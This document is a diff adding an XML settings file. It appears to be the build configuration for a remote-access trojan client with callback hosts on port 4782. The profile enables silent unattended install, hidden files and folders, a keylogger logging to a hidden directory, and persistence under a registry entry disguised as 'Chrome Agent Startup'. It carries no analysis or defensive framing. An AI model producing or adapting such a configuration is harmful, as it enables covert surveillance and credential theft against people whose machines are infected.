@@ -1,0 +1,38 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>192.168.2.101:4782;192.168.2.106:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>6195bbf9-38e5-4f86-9710-eaa9edb6a8f0</Mutex>
+  <UnattendedMode>True</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>AgentClient</InstallName>
+  <InstallPath>3</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Chrome Agent Startup</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
